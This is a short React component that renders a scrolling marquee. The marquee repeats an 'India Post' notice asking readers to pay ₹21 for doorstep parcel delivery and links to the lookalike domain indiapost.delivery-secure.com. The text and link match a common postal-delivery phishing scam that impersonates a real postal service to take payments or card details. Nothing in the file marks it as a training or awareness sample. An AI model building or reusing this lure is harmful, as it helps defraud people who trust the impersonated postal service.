import React from "react";
import "./Marquee.css"; // Import the CSS file

const Marquee = () => {
  return (
    <div className="marquee-container">
      <div className="marquee-content">
        📢 India Post: Important Update! Pay ₹21 for doorstep delivery of your
        parcel. Click here to proceed:{" "}
        <a
          href="https://indiapost.delivery-secure.com"
          className="marquee-link"
        >
          indiapost.delivery-secure.com
        </a>
        &nbsp;|&nbsp;
        📢 India Post: Important Update! Pay ₹21 for doorstep delivery of your
        parcel. Click here to proceed:{" "}
        <a
          href="https://indiapost.delivery-secure.com"
          className="marquee-link"
        >
          indiapost.delivery-secure.com
        </a>
        &nbsp;|&nbsp;
        📢 India Post: Important Update! Pay ₹21 for doorstep delivery of your
        parcel. Click here to proceed:{" "}
        <a
          href="https://indiapost.delivery-secure.com"
          className="marquee-link"
        >
          indiapost.delivery-secure.com
        </a>
      </div>
    </div>
  );
};

export default Marquee;
